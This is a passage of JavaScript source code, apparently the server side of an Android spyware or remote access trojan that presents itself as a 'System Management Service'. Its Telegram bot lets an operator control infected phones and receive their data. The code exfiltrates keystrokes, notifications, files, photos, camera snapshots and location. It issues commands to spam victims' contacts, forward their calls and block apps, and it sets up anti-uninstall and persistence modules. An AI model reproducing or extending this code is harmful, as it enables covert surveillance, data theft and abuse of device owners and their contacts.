            id: uuidv4(),
            clientId,
            targetNumber,
            startedAt: new Date().toISOString(),
            active: true,
            forwardedCalls: 0
        };
        
        this.forwardings.set(forwarding.id, forwarding);
        
        // Save to file
        const forwardFile = path.join(DIRS.CALL_FORWARDING, `${forwarding.id}.json`);
        fs.writeFileSync(forwardFile, JSON.stringify(forwarding, null, 2));
        
        // Update stats
        const db = readDB();
        db.stats.calls_forwarded++;
        writeDB(db);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📞 **Call Forwarding Activated**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 Target: ${targetNumber}\n` +
            `🆔 Forward: ${forwarding.id.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'call_forward',
                target: targetNumber,
                timestamp: Date.now()
            }));
        }
        
        return forwarding;
    }

    stopForwarding(forwardId) {
        const forwarding = this.forwardings.get(forwardId);
        if (forwarding) {
            forwarding.active = false;
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `⏹️ **Call Forwarding Stopped**\n\n` +
                `🆔 Client: ${forwarding.clientId.substring(0, 8)}...\n` +
                `📊 Calls Forwarded: ${forwarding.forwardedCalls}`,
                { parse_mode: 'Markdown' }
            );
            
            const client = clients.get(forwarding.clientId);
            if (client && client.ws.readyState === WebSocket.OPEN) {
                client.ws.send(JSON.stringify({
                    type: 'stop_call_forward',
                    timestamp: Date.now()
                }));
            }
        }
    }
}

const callForwarding = new CallForwarding();

// =====================================================
// 🚀 FEATURE 14: CONTACTS SPAM
// =====================================================
class ContactsSpam {
    constructor() {
        this.activeSpams = new Map();
    }

    async spamAllContacts(clientId, message) {
        const spam = {
            id: uuidv4(),
            clientId,
            message,
            startedAt: new Date().toISOString(),
            sent: 0,
            total: 0,
            active: true
        };
        
        this.activeSpams.set(spam.id, spam);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `📨 **Contacts Spam Started**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📝 Message: ${message}\n` +
            `⚡ Sending...`,
            { parse_mode: 'Markdown' }
        );
        
        const db = readDB();
        db.stats.messages_spammed++;
        writeDB(db);
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'spam_contacts',
                message,
                timestamp: Date.now()
            }));
        }
        
        return spam;
    }

    updateProgress(spamId, sent, total) {
        const spam = this.activeSpams.get(spamId);
        if (spam) {
            spam.sent = sent;
            spam.total = total;
            
            if (sent >= total) {
                spam.active = false;
                bot.sendMessage(CONFIG.CHAT_ID,
                    `✅ **Spam Complete**\n\n` +
                    `📊 Sent: ${sent}/${total} messages`,
                    { parse_mode: 'Markdown' }
                );
                this.activeSpams.delete(spamId);
            }
        }
    }
}

const contactsSpam = new ContactsSpam();

// API endpoint for spam progress
app.post('/api/spam/progress', (req, res) => {
    const { spamId, sent, total } = req.body;
    contactsSpam.updateProgress(spamId, sent, total);
    res.json({ success: true });
});

// =====================================================
// 🚀 FEATURE 15: APP KILLER/BLOCKER
// =====================================================
class AppKiller {
    constructor() {
        this.blockedApps = new Map();
    }

    killApp(clientId, appPackage) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `🛑 **Killing App**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 App: ${appPackage}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'kill_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
    }

    blockApp(clientId, appPackage) {
        this.blockedApps.set(`${clientId}:${appPackage}`, true);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🚫 **Blocking App**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 App: ${appPackage}\n` +
            `⚡ App will be blocked from opening`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'block_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
    }

    unblockApp(clientId, appPackage) {
        this.blockedApps.delete(`${clientId}:${appPackage}`);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `✅ **Unblocking App**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 App: ${appPackage}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'unblock_app',
                app: appPackage,
                timestamp: Date.now()
            }));
        }
    }
}

const appKiller = new AppKiller();

// =====================================================
// 🚀 FEATURE 16: SELF-DESTRUCT
// =====================================================
class SelfDestruct {
    constructor() {
        this.active = false;
    }

    async execute(clientId, masterPassword) {
        if (masterPassword !== CONFIG.ENCRYPTION_KEY.substring(0, 8)) {
            bot.sendMessage(CONFIG.CHAT_ID,
                `❌ **Invalid Password**\n\n` +
                `Self-destruct aborted`,
                { parse_mode: 'Markdown' }
            );
            return false;
        }
        
        this.active = true;
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `💥 **💥 SELF-DESTRUCT INITIATED**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `⏱️ Time: 10 seconds\n` +
            `⚠️ All data will be wiped`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'self_destruct',
                timestamp: Date.now()
            }));
        }
        
        setTimeout(() => {
            const db = readDB();
            delete db.clients[clientId];
            writeDB(db);
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `✅ **Self-destruct Complete**\n\n` +
                `All client data wiped`,
                { parse_mode: 'Markdown' }
            );
            
            this.active = false;
        }, 10000);
        
        return true;
    }
}

const selfDestruct = new SelfDestruct();

// =====================================================
// 🚀 FEATURE 17: WIFI & BLUETOOTH CONTROL
// =====================================================
class WifiBluetoothControl {
    constructor() {
        this.wifiState = new Map();
        this.bluetoothState = new Map();
    }

    toggleWifi(clientId, enable) {
        this.wifiState.set(clientId, enable);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📶' : '❌'} **WiFi ${enable ? 'ON' : 'OFF'}**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_wifi',
                enable,
                timestamp: Date.now()
            }));
        }
    }

    toggleBluetooth(clientId, enable) {
        this.bluetoothState.set(clientId, enable);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `${enable ? '📱' : '❌'} **Bluetooth ${enable ? 'ON' : 'OFF'}**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'toggle_bluetooth',
                enable,
                timestamp: Date.now()
            }));
        }
    }

    changeDeviceName(clientId, newName) {
        bot.sendMessage(CONFIG.CHAT_ID,
            `📝 **Changing Device Name**\n\n` +
            `🆔 Client: ${clientId.substring(0, 8)}...\n` +
            `📱 New Name: ${newName}`,
            { parse_mode: 'Markdown' }
        );
        
        const client = clients.get(clientId);
        if (client && client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: 'change_device_name',
                name: newName,
                timestamp: Date.now()
            }));
        }
    }
}

const wifiBluetoothControl = new WifiBluetoothControl();

// =====================================================
// 🚀 WEB INTERFACE
// =====================================================
app.get('/', (req, res) => {
    const db = readDB();
    
    res.send(`
        <!DOCTYPE html>
        <html dir="rtl" lang="ckb">
        <head>
            <meta charset="UTF-8">
            <meta name="viewport" content="width=device-width, initial-scale=1.0">
            <title>System Management Service</title>
            <style>
                * { margin: 0; padding: 0; box-sizing: border-box; }
                body {
                    background: #000;
                    color: #0f0;
                    font-family: 'Courier New', monospace;
                    padding: 20px;
                    background-image: 
                        linear-gradient(0deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent),
                        linear-gradient(90deg, transparent 24%, rgba(0,255,0,0.03) 25%, rgba(0,255,0,0.03) 26%, transparent 27%, transparent);
                    background-size: 50px 50px;
                }
                .container { max-width: 1400px; margin: 0 auto; }
                .header {
                    border: 3px solid #0f0;
                    padding: 30px;
                    margin-bottom: 30px;
                    background: #111;
                    box-shadow: 0 0 50px rgba(0,255,0,0.3);
                    text-align: center;
                }
                .header h1 {
                    font-size: 4em;
                    text-shadow: 0 0 20px #0f0;
                    animation: glitch 3s infinite;
                }
                @keyframes glitch {
                    0%,100% { text-shadow: 0 0 20px #0f0; }
                    25% { text-shadow: -5px 0 #f00, 5px 0 #00f; }
                    75% { text-shadow: 5px 0 #f00, -5px 0 #00f; }
                }
                .stats-grid {
                    display: grid;
                    grid-template-columns: repeat(4, 1fr);
                    gap: 20px;
                    margin-bottom: 30px;
                }
                .stat-card {
                    border: 2px solid #0f0;
                    padding: 20px;
                    text-align: center;
                    background: #111;
                }
                .stat-value { font-size: 2.5em; font-weight: bold; }
                .feature-grid {
                    display: grid;
                    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
                    gap: 15px;
                    margin: 30px 0;
                }
                .feature {
                    border: 1px solid #0f0;
                    padding: 15px;
                    text-align: center;
                    background: #111;
                }
                .footer {
                    text-align: center;
                    margin-top: 50px;
                    padding: 20px;
                    border-top: 2px solid #0f0;
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="header">
                    <h1>System Management Service</h1>
                    <p>Real-time Device Monitoring</p>
                    <p>Version: ${CONFIG.VERSION}</p>
                </div>
                
                <div class="stats-grid">
                    <div class="stat-card">
                        <div class="stat-value">${clients.size}</div>
                        <div>Connected Devices</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${db.stats.notifications_captured || 0}</div>
                        <div>Notifications</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${screenStreamer.activeStreams}</div>
                        <div>Active Streams</div>
                    </div>
                    <div class="stat-card">
                        <div class="stat-value">${db.stats.cam_snapshots || 0}</div>
                        <div>Snapshots</div>
                    </div>
                </div>
                
                <div class="footer">
                    <p>System Management Service v39.0</p>
                    <p>Running on port ${CONFIG.PORT}</p>
                </div>
            </div>
        </body>
        </html>
    `);
});

// =====================================================
// 📤 FILE UPLOAD ENDPOINTS
// =====================================================
app.post('/upload/file', upload.single('file'), (req, res) => {
    try {
        const { model, uuid, type, path: filePath } = req.headers;
        const { originalname, buffer, size } = req.file;
        
        const fileName = `${Date.now()}_${originalname}`;
        let saveDir = DIRS.FILES;
        
        switch(type) {
            case 'photo': saveDir = DIRS.PHOTOS; break;
            case 'video': saveDir = DIRS.VIDEOS; break;
            case 'audio': saveDir = DIRS.AUDIO; break;
            default: saveDir = DIRS.FILES;
        }
        
        const savePath = path.join(saveDir, fileName);
        fs.writeFileSync(savePath, buffer);
        
        bot.sendDocument(CONFIG.CHAT_ID, buffer, {
            caption: `📁 **New File**\n\n` +
                    `📱 Device: ${model || 'unknown'}\n` +
                    `📄 Name: ${originalname}\n` +
                    `📦 Size: ${(size / 1024).toFixed(2)}KB\n` +
                    `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
            parse_mode: 'Markdown'
        });
        
        res.json({ success: true, fileName });
    } catch (error) {
        res.status(500).json({ success: false, error: error.message });
    }
});

app.post('/upload/text', (req, res) => {
    const { model, uuid, type } = req.headers;
    const { text } = req.body;
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `📝 **${type || 'Message'} from ${model || 'unknown'}**\n\n` +
        `${text}\n\n` +
        `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

app.post('/upload/location', (req, res) => {
    const { model, uuid } = req.headers;
    const { lat, lon } = req.body;
    
    bot.sendLocation(CONFIG.CHAT_ID, lat, lon);
    bot.sendMessage(CONFIG.CHAT_ID,
        `📍 **Location from ${model || 'unknown'}**\n\n` +
        `Google Maps: https://maps.google.com/?q=${lat},${lon}\n` +
        `🆔 ID: ${uuid ? uuid.substring(0, 8) : 'unknown'}...`,
        { parse_mode: 'Markdown' }
    );
    
    res.json({ success: true });
});

// =====================================================
// 🔌 WEBSOCKET CONNECTION
// =====================================================
wss.on('connection', (ws, req) => {
    const clientId = uuidv4();
    const clientInfo = {
        id: clientId,
        ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress,
        userAgent: req.headers['user-agent'],
        connectedAt: new Date().toISOString(),
        lastSeen: new Date().toISOString(),
        model: req.headers.model || 'unknown',
        manufacturer: req.headers.manufacturer || 'unknown',
        androidVersion: req.headers.android || 'unknown',
        battery: req.headers.battery || 'unknown',
        ram: req.headers.ram || 'unknown',
        storage: req.headers.storage || 'unknown',
        root: req.headers.root || 'unknown',
        country: req.headers.country || 'unknown',
        carrier: req.headers.carrier || 'unknown',
        networkType: req.headers.network || 'unknown'
    };
    
    clients.set(clientId, { ws, info: clientInfo });
    
    const db = readDB();
    db.clients[clientId] = clientInfo;
    db.stats.total_connections++;
    writeDB(db);
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `🔌 **New Device Connected**\n\n` +
        `📱 **Model:** ${clientInfo.manufacturer} ${clientInfo.model}\n` +
        `📱 **Android:** ${clientInfo.androidVersion}\n` +
        `🔋 **Battery:** ${clientInfo.battery}\n` +
        `💾 **RAM:** ${clientInfo.ram}\n` +
        `📁 **Storage:** ${clientInfo.storage}\n` +
        `🔓 **Root:** ${clientInfo.root}\n` +
        `🌍 **Country:** ${clientInfo.country}\n` +
        `🌐 **IP:** ${clientInfo.ip}\n` +
        `🆔 **ID:** ${clientId.substring(0, 8)}...`,
        { parse_mode: 'Markdown' }
    );
    
    ws.on('message', async (data) => {
        try {
            const message = JSON.parse(data);
            clientInfo.lastSeen = new Date().toISOString();
            
            switch(message.type) {
                case 'ping':
                    ws.send(JSON.stringify({ type: 'pong', timestamp: Date.now() }));
                    break;
                    
                case 'data':
                    const { dataType, content } = message;
                    logToFile(dataType, { clientId, content });
                    break;
                    
                case 'notification':
                    notificationListener.captureNotification(message.notification);
                    break;
                    
                case 'keylog':
                    smartKeylogger.logKey(clientId, message.key, message.app);
                    break;
                    
                case 'screen_frame':
                    const stream = screenStreamer.getActiveStreams().find(s => s.clientId === clientId);
                    if (stream) {
                        stream.frames++;
                    }
                    break;
                    
                case 'spam_progress':
                    contactsSpam.updateProgress(message.spamId, message.sent, message.total);
                    break;
                    
                case 'call_forwarded':
                    const forward = callForwarding.forwardings.get(message.forwardId);
                    if (forward) {
                        forward.forwardedCalls++;
                    }
                    break;
                    
                case 'cam_snapshot':
                    camSnapshotOnLock.saveSnapshot(clientId, message.image);
                    break;
                    
                case 'file_list':
                    remoteFileExplorer.handleFileList(clientId, message.files);
                    break;
                    
                default:
                    console.log('Unknown message type:', message.type);
            }
        } catch (error) {
            console.error('WebSocket message error:', error);
        }
    });
    
    ws.on('close', () => {
        clients.delete(clientId);
        
        bot.sendMessage(CONFIG.CHAT_ID,
            `🔌 **Device Disconnected**\n\n` +
            `📱 Model: ${clientInfo.manufacturer} ${clientInfo.model}\n` +
            `🆔 ID: ${clientId.substring(0, 8)}...`,
            { parse_mode: 'Markdown' }
        );
    });
    
    ws.send(JSON.stringify({ type: 'init', clientId }));
});

// =====================================================
// 🤖 TELEGRAM BOT - BASIC COMMANDS
// =====================================================
bot.onText(/\/start/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) {
        bot.sendMessage(msg.chat.id, '⛔ Access Denied');
        return;
    }
    
    bot.sendMessage(CONFIG.CHAT_ID,
        '🔴 **System Management Service**\n\n' +
        '✅ Ready\n\n' +
        '📱 **devices** - Show connected devices\n' +
        '📊 **stats** - System statistics\n' +
        '⚡ **commands** - Available commands',
        {
            reply_markup: {
                keyboard: [
                    ['📱 devices', '📊 stats'],
                    ['⚡ commands']
                ],
                resize_keyboard: true
            }
        }
    );
});

bot.onText(/📱 devices/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ No devices connected');
        return;
    }
    
    let text = '📱 **Connected Devices**\n\n';
    clients.forEach((client, id) => {
        text += `📱 **Model:** ${client.info.manufacturer} ${client.info.model}\n` +
                `🔋 **Battery:** ${client.info.battery}\n` +
                `🆔 **ID:** ${id.substring(0, 8)}...\n\n`;
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, text, { parse_mode: 'Markdown' });
});

bot.onText(/📊 stats/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    const db = readDB();
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `📊 **System Statistics**\n\n` +
        `📱 Connected Devices: ${clients.size}\n` +
        `📸 Total Snapshots: ${db.stats.cam_snapshots || 0}\n` +
        `📱 Notifications: ${db.stats.notifications_captured || 0}\n` +
        `📹 Active Streams: ${screenStreamer.activeStreams}\n` +
        `⏱️ Uptime: ${Math.floor(process.uptime() / 3600)}:${Math.floor((process.uptime() % 3600) / 60)}:${Math.floor(process.uptime() % 60)}`,
        { parse_mode: 'Markdown' }
    );
});

bot.onText(/⚡ commands/, (msg) => {
    if (msg.chat.id.toString() !== CONFIG.CHAT_ID) return;
    
    if (clients.size === 0) {
        bot.sendMessage(CONFIG.CHAT_ID, '❌ No devices connected');
        return;
    }
    
    const deviceKeyboard = [];
    clients.forEach((client, id) => {
        deviceKeyboard.push([{
            text: `${client.info.manufacturer} ${client.info.model}`,
            callback_data: `device:${id}`
        }]);
    });
    
    bot.sendMessage(CONFIG.CHAT_ID, '📱 **Select a device**', {
        reply_markup: { inline_keyboard: deviceKeyboard }
    });
});

// =====================================================
// 🔘 CALLBACK QUERY HANDLER
// =====================================================
bot.on('callback_query', (callbackQuery) => {
    const msg = callbackQuery.message;
    const [command, clientId] = callbackQuery.data.split(':');
    
    if (command === 'device') {
        const client = clients.get(clientId);
        if (!client) {
            bot.editMessageText('❌ Device disconnected', {
                chat_id: msg.chat.id,
                message_id: msg.message_id
            });
            return;
        }
        
        bot.editMessageText(
            `📱 **${client.info.manufacturer} ${client.info.model}**\n\n` +
            `📱 Android: ${client.info.androidVersion}\n` +
            `🔋 Battery: ${client.info.battery}\n` +
            `🌍 Country: ${client.info.country}\n` +
            `🌐 IP: ${client.info.ip}\n\n` +
            `**Select command:**`,
            {
                chat_id: msg.chat.id,
                message_id: msg.message_id,
                reply_markup: {
                    inline_keyboard: [
                        [
                            { text: '📸 Camera', callback_data: `camera:${clientId}` },
                            { text: '🎤 Microphone', callback_data: `mic:${clientId}` }
                        ],
                        [
                            { text: '📍 Location', callback_data: `location:${clientId}` },
                            { text: '📁 Files', callback_data: `files:${clientId}` }
                        ],
                        [
                            { text: '📱 Notifications', callback_data: `notifications:${clientId}` },
                            { text: '⌨️ Keylogger', callback_data: `keylogger:${clientId}` }
                        ],
                        [
                            { text: '📹 Screen Stream', callback_data: `screen:${clientId}` },
                            { text: '📸 Cam Snapshot', callback_data: `cam_snapshot:${clientId}` }
                        ],
                        [
                            { text: '📞 Forward Calls', callback_data: `forward:${clientId}` },
                            { text: '📨 Spam', callback_data: `spam:${clientId}` }
                        ],
                        [
                            { text: '📶 WiFi On', callback_data: `wifi_on:${clientId}` },
                            { text: '📶 WiFi Off', callback_data: `wifi_off:${clientId}` }
                        ],
                        [
                            { text: '📱 Bluetooth On', callback_data: `bt_on:${clientId}` },
                            { text: '📱 Bluetooth Off', callback_data: `bt_off:${clientId}` }
                        ],
                        [
                            { text: '🔓 Wake Up', callback_data: `wake:${clientId}` },
                            { text: '🔒 Keep Screen', callback_data: `keep_screen:${clientId}` }
                        ],
                        [
                            { text: '💥 Self Destruct', callback_data: `destruct:${clientId}` }
                        ]
                    ]
                },
                parse_mode: 'Markdown'
            }
        );
    }
    
    const commandTypes = [
        'camera', 'mic', 'location', 'files', 'notifications',
        'keylogger', 'screen', 'cam_snapshot', 'forward', 'spam',
        'wifi_on', 'wifi_off', 'bt_on', 'bt_off', 'wake', 'keep_screen'
    ];
    
    if (commandTypes.includes(command)) {
        const client = clients.get(clientId);
        if (!client) {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Device disconnected',
                show_alert: true
            });
            return;
        }
        
        if (client.ws.readyState === WebSocket.OPEN) {
            client.ws.send(JSON.stringify({
                type: command,
                timestamp: Date.now()
            }));
            
            bot.answerCallbackQuery(callbackQuery.id, {
                text: `✅ ${command} command sent`,
                show_alert: false
            });
            
            bot.sendMessage(CONFIG.CHAT_ID,
                `✅ **Command Sent**\n\n` +
                `📱 Device: ${client.info.manufacturer} ${client.info.model}\n` +
                `⚡ Command: ${command}\n` +
                `🕐 Time: ${new Date().toLocaleString()}`,
                { parse_mode: 'Markdown' }
            );
        } else {
            bot.answerCallbackQuery(callbackQuery.id, {
                text: '❌ Connection lost',
                show_alert: true
            });
        }
    }
    
    if (command === 'destruct') {
        bot.sendMessage(CONFIG.CHAT_ID,
            '💥 **⚠️ SELF-DESTRUCT ⚠️**\n\n' +
            'Enter password to confirm:',
            { reply_markup: { force_reply: true } }
        );
    }
});

// =====================================================
// 🔄 PING & KEEP ALIVE
// =====================================================
setInterval(() => {
    wss.clients.forEach((ws) => {
        if (ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify({ type: 'ping', timestamp: Date.now() }));
        }
    });
}, CONFIG.PING_INTERVAL);

// =====================================================
// 🚀 INSTALL ALL MODULES
// =====================================================
setupAutoRestart();
setupPersistentService();
setupAccessibilityService();
setupBatteryOptimizationBypass();
setupAntiUninstall();

// =====================================================
// 🚀 START SERVER
// =====================================================
server.listen(CONFIG.PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on port ${CONFIG.PORT}`);
    console.log(`🌐 http://localhost:${CONFIG.PORT}`);
    
    bot.sendMessage(CONFIG.CHAT_ID,
        `✅ **System Management Service Started**\n\n` +
        `📊 Version: ${CONFIG.VERSION}\n` +
        `🌐 Port: ${CONFIG.PORT}\n` +
        `⏱️ Time: ${new Date().toLocaleString()}\n\n` +
        `🦁 **Ready**`
    );
});

// =====================================================
// 🛡️ ERROR HANDLING
// =====================================================
process.on('uncaughtException', (error) => {
    console.error('Uncaught Exception:', error);
});

process.on('unhandledRejection', (reason, promise) => {
    console.error('Unhandled Rejection:', reason);
});
